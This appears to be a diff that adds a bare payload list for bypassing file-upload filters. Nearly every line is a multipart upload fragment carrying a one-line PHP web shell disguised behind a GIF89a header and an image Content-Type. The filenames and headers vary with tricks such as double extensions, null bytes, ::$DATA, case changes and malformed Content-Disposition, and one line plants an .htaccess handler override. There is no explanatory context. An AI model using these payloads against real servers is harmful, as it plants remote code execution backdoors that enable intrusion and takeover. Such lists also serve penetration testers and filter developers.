@@ -1,0 +1,28 @@
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php."\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php "\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="[0x09]1.php"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php "\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename=".htaccess"\nContent-Type: image/gif\n\nSetHandler application/x-httpd-php
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php. ."\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php5"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.phtml"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.pHt"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.phP"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php::$DATA"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.phphpp"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php%00.jpg"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php.gif"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php.gif"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php.php_"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename=1.php\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php";filename1=”test.jpg”\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: f+orm-data  ; name="upload_file"; filename="1.php"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition:; name="upload_file"; filename="1.php"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data                                                          ; name="upload_file"; filename="1.php"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition:                                 form-data; name="upload_file"; filename="1.php"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php%0a"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php::$DATA\0x00\1.php0x00.jpg"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Disposition: +form-data  ; name="upload_file"; filename="1.php"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
+Content-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>\nContent-Disposition: +form-data  ; name="upload_file"; filename="1.php"
+Content-Disposition: form-data  ; name="upload_file"; filename="1.php;.gif ;.jpeg"\nContent-Type: image/gif\n\nGIF89a<?php @eval($_GET["fuc"]);?>
